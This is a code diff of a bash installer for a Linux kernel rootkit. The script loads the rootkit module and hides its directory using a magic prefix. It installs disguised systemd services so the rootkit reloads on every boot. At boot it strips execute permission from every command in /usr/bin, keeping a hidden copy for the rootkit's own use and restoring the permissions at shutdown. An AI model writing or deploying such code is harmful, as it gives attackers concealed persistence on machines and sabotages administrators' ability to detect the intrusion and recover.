@@ -1,5 +1,7 @@
 #!/bin/bash
 
+makeImmutable=true
+
 make
 
 koFile=$(ls *.ko)
@@ -8,6 +10,7 @@ if test -f "$koFile"; then
     
     # Load the rootkit's kernel module:
     insmod "$koFile"
+    echo "Loaded."
 
     # Hide current directory via the MAGIC_PREFIX:
     magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
@@ -16,37 +19,67 @@ if test -f "$koFile"; then
     mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
     cd '../'"$magicPrefix""$thisDir"
     thisDirPath=$(pwd)
+    echo "Hidden."
 
-    # Load rootkit on boot:
+    # Copy all commands in /usr/bin to trove dir
+    trovePath='../'"$magicPrefix""trove"
+    if $makeImmutable; then
+        mkdir "$trovePath"
+        cp -r /usr/bin/* "$trovePath"
+        $trovePath"/echo" "Trove."
+    fi
+
+    # Boot script:
     touch boot.sh
     chmod +x boot.sh
     echo "#!/bin/bash" >> boot.sh
     echo "insmod $thisDirPath/$koFile" >> boot.sh
+    if $makeImmutable; then
+        echo "$trovePath/chmod -x /usr/bin/*" >> boot.sh
+    fi
     bootPath="$thisDirPath/boot.sh"
-    loadServicePath="/etc/systemd/system/""$magicPrefix""load.service"
-    touch $loadServicePath
-    echo "[Unit]" >> "$loadServicePath"
-    echo "Description=Joe Mamma" >> "$loadServicePath"
-    echo "After=multi-user.target" >> "$loadServicePath"
-    echo "" >> "$loadServicePath"
-    echo "[Service]" >> "$loadServicePath"
-    echo "Type=simple" >> "$loadServicePath"
-    echo "RemainAfterExit=yes" >> "$loadServicePath"
-    echo "ExecStart=$bootPath" >> "$loadServicePath"
-    echo "TimeoutStartSec=0" >> "$loadServicePath"
-    echo "" >> "$loadServicePath"
-    echo "[Install]" >> "$loadServicePath"
-    echo "WantedBy=default.target" >> "$loadServicePath" 
+    bootServicePath="/etc/systemd/system/""$magicPrefix""load.service"
+    touch $bootServicePath
+    echo "[Unit]" >> "$bootServicePath"
+    echo "Description=Joe Mamma" >> "$bootServicePath"
+    echo "After=multi-user.target" >> "$bootServicePath"
+    echo "" >> "$bootServicePath"
+    echo "[Service]" >> "$bootServicePath"
+    echo "Type=simple" >> "$bootServicePath"
+    echo "RemainAfterExit=yes" >> "$bootServicePath"
+    echo "ExecStart=$bootPath" >> "$bootServicePath"
+    echo "TimeoutStartSec=0" >> "$bootServicePath"
+    echo "" >> "$bootServicePath"
+    echo "[Install]" >> "$bootServicePath"
+    echo "WantedBy=default.target" >> "$bootServicePath" 
     systemctl daemon-reload
-    systemctl enable "$loadServicePath"   
+    systemctl enable "$bootServicePath"
+    echo "Boot."
 
-    # Make system indestructable, secured via MAGIC_PREFIX
-    trovePath='../'"$magicPrefix""trove"
-    mkdir "$trovePath"
-    cp -r /usr/bin/* "$trovePath"
-    $trovePath"/echo" "Trove done."
+    # Shutdown script:
+    if $makeImmutable; then
+        touch shutdown.sh
+        chmod +x shutdown.sh
+        echo "#!/+bin/bash" >> shutdown.sh
+        echo "$trovePath/chmod +x /usr/bin/*" >> shutdown.sh
+        shutdownPath="$thisDirPath/shutdown.sh"
+        shutdownServicePath="/etc/systemd/system/""$magicPrefix""shutdown.service"
+        touch $shutdownServicePath
+        echo "[Unit]" >> "$shutdownServicePath"
+        echo "Description=Joe Mamma" >> "$shutdownServicePath"
+        echo "DefaultDependencies=no" >> "$shutdownServicePath"
+        echo "Before=shutdown.target" >> "$shutdownServicePath"
+        echo "" >> "$shutdownServicePath"
+        echo "[Service]" >> "$shutdownServicePath"
+        echo "Type=oneshot" >> "$shutdownServicePath"
+        echo "ExecStart=$shutdownPath" >> "$shutdownServicePath"
+        echo "TimeoutStartSec=0" >> "$shutdownServicePath"
+        echo "" >> "$shutdownServicePath"
+        echo "[Install]" >> "$shutdownServicePath"
+        echo "WantedBy=shutdown.target" >> "$shutdownServicePath" 
+        systemctl daemon-reload
+        systemctl enable "$shutdownServicePath"
+    fi
 
-    # Others:
-
-    echo "built."
+    echo "Built."
 fi
